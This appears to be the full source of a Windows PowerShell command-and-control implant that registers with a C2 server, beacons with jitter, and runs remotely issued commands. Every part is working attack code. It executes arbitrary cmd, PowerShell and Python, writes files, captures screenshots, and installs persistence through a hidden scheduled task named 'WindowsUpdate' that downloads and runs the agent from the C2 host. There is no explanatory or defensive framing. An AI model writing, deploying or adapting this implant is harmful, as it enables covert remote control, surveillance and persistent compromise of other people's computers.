# C2 Agent — Windows PowerShell
$C2 = if ($env:C2_URL) { $env:C2_URL } else { "http://CHANGE_ME:443" }
$AgentId = if ($env:AGENT_ID) { $env:AGENT_ID } else { [guid]::NewGuid().ToString() }
$Sleep = if ($env:SLEEP) { [int]$env:SLEEP } else { 5 }
$Jitter = if ($env:JITTER) { [int]$env:JITTER } else { 10 }

function Post($path, $body) {
    $json = $body | ConvertTo-Json -Depth 5
    try {
        $resp = Invoke-RestMethod -Uri "$C2$path" -Method POST -Body $json -ContentType "application/json" -TimeoutSec 15
        return $resp
    } catch { return $null }
}

function Register {
    $info = @{
        id = $AgentId
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        os = "Windows $([System.Environment]::OSVersion.Version.ToString())"
        arch = $env:PROCESSOR_ARCHITECTURE
        ip_internal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object -First 1).IPAddress
        platform_type = "machine"
    }
    Post "/api/agent/register" $info
}

function Execute-Task($task) {
    $type = $task.task_type
    $payload = $task.payload
    $result = ""

    try {
        switch ($type) {
            "cmd" {
                $result = cmd.exe /c $payload 2>&1 | Out-String
            }
            "powershell" {
                $result = Invoke-Expression $payload 2>&1 | Out-String
            }
            "python" {
                $result = python -c $payload 2>&1 | Out-String
            }
            "download" {
                if (Test-Path $payload) {
                    $bytes = (Get-Item $payload).Length
                    $result = "[file:$payload] $bytes bytes"
                } else { $result = "Not found: $payload" }
            }
            "upload" {
                $parts = $payload -split '\|', 2
                if ($parts.Count -eq 2) {
                    [IO.File]::WriteAllBytes($parts[0], [Convert]::FromBase64String($parts[1]))
                    $result = "Written $($parts[0])"
                }
            }
            "screenshot" {
                Add-Type -AssemblyName System.Windows.Forms
                $b = [System.Drawing.Rectangle]::FromLTRB(0,0,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
                $bmp = New-Object System.Drawing.Bitmap($b.Width,$b.Height)
                $g = [System.Drawing.Graphics]::FromImage($bmp)
                $g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size)
                $path = "$env:TEMP\screen.png"
                $bmp.Save($path)
                $result = "Screenshot: $path"
            }
            "persist" {
                $cmd = "powershell -ep bypass -w hidden -c `"IEX(New-Object Net.WebClient).DownloadString('$C2/agents/agent_windows.ps1')`""
                Register-ScheduledTask -TaskName "WindowsUpdate" -Trigger (New-ScheduledTaskTrigger -AtStartup) -Action (New-ScheduledTaskAction -Execute "powershell" -Argument "-ep bypass -w hidden -c $cmd") -Force | Out-Null
                $result = "Persistence via ScheduledTask: WindowsUpdate"
            }
            "kill" {
                Unregister-ScheduledTask -TaskName "WindowsUpdate" -Confirm:$false -ErrorAction SilentlyContinue
                $result = "Terminating"
                Post "/api/agent/result" @{ task_id = $task.id; result = $result }
                exit
            }
            default { $result = "Unknown type: $type" }
        }
    } catch {
        $result = "[error] $_"
    }

    if ($result.Length -gt 65000) { $result = $result.Substring(0, 65000) + "`n[...truncated]" }
    return $result
}

Register

while ($true) {
    try {
        $resp = Post "/api/agent/beacon" @{ id = $AgentId }
        if ($resp -and $resp.tasks) {
            foreach ($task in $resp.tasks) {
                $result = Execute-Task $task
                Post "/api/agent/result" @{ task_id = $task.id; result = $result }
            }
        }
    } catch {}

    $jitterSecs = $Sleep * $Jitter / 100
    $actualSleep = $Sleep + (Get-Random -Minimum (-$jitterSecs) -Maximum $jitterSecs)
    Start-Sleep -Seconds ([Math]::Max(1, $actualSleep))
}
